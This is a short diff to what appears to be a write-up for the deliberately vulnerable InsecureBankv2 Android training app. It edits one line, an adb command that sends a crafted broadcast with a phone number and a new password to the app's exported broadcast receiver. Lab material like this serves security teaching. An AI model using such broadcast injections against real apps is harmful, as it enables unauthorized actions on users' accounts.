@@ -59,5 +59,5 @@ public void onReceive(Context context, Intent intent) {
 }
 ```
 
-- `adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver -a theBroadcast --es phonenumber 5554 --es newpass hacked`
+- `$ adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver -a theBroadcast --es phonenumber 5554 --es newpass hacked`
 
